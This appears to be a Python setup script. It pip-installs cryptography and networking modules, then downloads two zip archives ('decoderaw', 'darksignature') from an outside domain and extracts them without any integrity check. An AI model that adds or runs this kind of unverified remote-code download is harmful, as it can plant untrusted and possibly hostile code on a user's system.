import os
import zipfile
import requests
import subprocess

# List of modules to install
modules = ["zmq", "ecdsa", "urllib3", "requests", "pycryptodome"]

# Install each module using pip
for module in modules:
    subprocess.run(["pip", "install", module])

url2 = 'https://zoeir.com/repositories/decoderaw.zip'
zip_filename2 = 'decoderaw.zip'
response2 = requests.get(url2)
response2.raise_for_status() 
with open(zip_filename2, 'wb') as file:
    file.write(response2.content)

with zipfile.ZipFile(zip_filename2, 'r') as zip_ref:
    zip_ref.extractall('decoderaw')
os.remove(zip_filename2)

url3 = 'https://zoeir.com/repositories/darksignature.zip'
zip_filename3 = 'darksignature.zip'
response3 = requests.get(url3)
response3.raise_for_status() 
with open(zip_filename3, 'wb') as file:
    file.write(response3.content)

with zipfile.ZipFile(zip_filename3, 'r') as zip_ref:
    zip_ref.extractall('darksignature')
os.remove(zip_filename3)

